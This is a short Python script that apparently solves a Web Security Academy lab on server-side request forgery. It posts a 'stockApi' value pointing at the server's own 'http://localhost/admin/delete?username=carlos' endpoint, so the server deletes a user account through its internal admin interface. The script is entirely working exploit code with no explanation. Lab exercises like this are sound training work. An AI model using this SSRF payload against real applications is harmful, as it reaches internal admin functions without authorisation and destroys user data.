import requests

s = requests.Session()
url = 'https://ac591f991f92d56c806aa5e800250022.web-security-academy.net/'
exploit = {
    'stockApi':'http://localhost/admin/delete?username=carlos'
}
resp = s.post(url + 'product/stock/',data=exploit)
print(resp.status_code)
print(resp.text)